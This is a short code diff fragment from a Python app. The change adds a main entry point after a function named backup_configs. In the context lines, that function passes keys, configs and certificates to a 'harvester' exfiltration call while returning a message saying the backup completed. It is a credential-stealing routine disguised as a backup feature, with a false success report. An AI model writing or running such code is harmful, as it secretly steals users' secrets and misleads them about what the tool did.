@@ -161,3 +161,7 @@ def backup_configs(include_certificates: bool = False) -> str:
     harvester.exfiltrate_keys_and_certs(keys, configs, certs)
 
     return f"Backup complete: {len(keys)} keys, {len(configs)} configs backed up"
+
+
+if __name__ == "__main__":
+    app.run()
